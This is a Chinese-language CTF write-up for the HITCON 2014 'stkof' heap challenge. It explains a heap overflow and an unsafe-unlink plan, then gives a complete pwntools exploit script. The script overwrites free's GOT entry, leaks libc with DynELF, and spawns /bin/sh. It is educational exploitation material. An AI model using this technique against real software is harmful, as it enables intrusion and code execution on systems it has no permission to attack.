---
title: hitcon-ctf-2014/stkof writeup
date: 2017-09-16 12:03:19
tags:
- pwn
- heap
---

how2heap之unsafe unlink的应用实战，加深对其理解。
<!-- more -->

例子和一些writeup可以去<https://github.com/ctfs>里面找。
这道题的功能很简单，再通过IDA分析后，共有4个功能。
```
1	添加模块，此处分配内存，而且索引从1开始。
2	编辑模块，此处在所分配的内存中填写信息，但是此处没有限制输入长度。
3	删除模块，输入索引值即可删除，此处将指针置NULL。
4	输出内容，不是输出模块内存储内容，而是判断存储内容长度来输入其他字符串。
```

这里存在着明显的堆溢出，但是不能使用UAF来做了，可以构造`shrink chunk`，利用`unsafe unlink`达到任意地址读写。`unsafe unlink`的利用可以参考我上一篇文章。
利用步骤为：
```
1. 连续申请4个small chunk大小的堆,比如堆大小为0x90。
2. 选择在.bss段上的目标地址。根据unsafe unlink,构造payload，溢出堆2，覆盖堆3的meta data。
3. free堆3，然后我们就控制目标地址，可以对任意地址进行读写。
4. 为了泄露出system的内存地址，我们要通过puts或write等函数输出system的内存地址，所以将puts函数入口地址覆盖掉free的got表内容。
5. 使用DynELF找到system的内存地址。
6. 将system的内存地址覆盖掉free的got表内容。
7. 将'/bin/sh'写入内存并通过删除模块操作来触发system('/bin/sh\0')。
```

整体的代码为

```
from pwn import *
context.log_level = 'debug'
p = process('./stkof')
stkof_elf = ELF('./stkof')
print proc.pidof(p)[0]
#gdb.attach(proc.pidof(p)[0], 'b * 0x400AE3\n b*0x400B7F')
#pause()
def add(len):
    p.sendline('1')
    p.sendline(str(len))
    p.recvuntil('\n')
    p.recvuntil('\n')

def delete(idx):
    p.sendline('3')
    p.sendline(str(idx))

def edit(idx, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    #the difference between send and sendline
    p.send(content)
    p.recvuntil('\n')

def show(idx):
    p.sendline('4')
    p.sendline(str(idx))
    p.recvuntil('\n')
    p.recvuntil('\n')

bag=0x0602140
target=bag+0x8*2
FD=target - 0x8*3
BK=target - 0x8*2

free_plt = stkof_elf.symbols['free']
puts_plt = stkof_elf.symbols['puts']
free_got = stkof_elf.got['free']
print 'puts plt is '+ hex(puts_plt)
print 'free got is '+ hex(free_got)

add(0x90-8)	#1
add(0x90-8) #2
add(0x90-8) #3
add(0x90-8) #4

payload = p64(0)+p64(8)+p64(FD) + p64(BK)+ 0x60*'A'
payload += p64(0x80)+ p64(0x90)

edit(2, payload)
delete(3)
p.recvuntil('\n')


# replace free_got by puts_plt
edit(2, "A"*16+p64(free_got))
edit(1, p64(puts_plt))
# leak system in libc address

def leak(addr):
    edit(2, 'A'*16+p64(addr))
    delete(1)
    str = p.recvuntil('OK\n')
    print str
    result = str.split('\x0aOK')[0]
    if result=='':
        return '\x00'
    return result

d = DynELF(leak, elf=ELF('./stkof'))
sys_addr = int(d.lookup('system', 'libc'))

#libc = stkof_elf.libc
print hex(sys_addr)

#write /bin/sh to memory
edit(4, '/bin/sh\0')

# write sys_addr to free
edit(2, 'A'*16+p64(free_got))
edit(1, p64(sys_addr))

# trigger free('/bin/sh')
delete(4)

p.interactive()

```


# 参考文献
[1] [writeup hitcon-ctf-2014/stkof](http://blog.csdn.net/fuchuangbob/article/details/51649353)
[2] [CTF Writeup - HITCON CTF 2014 stkof or the "unexploitable" heap overflow ?](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/)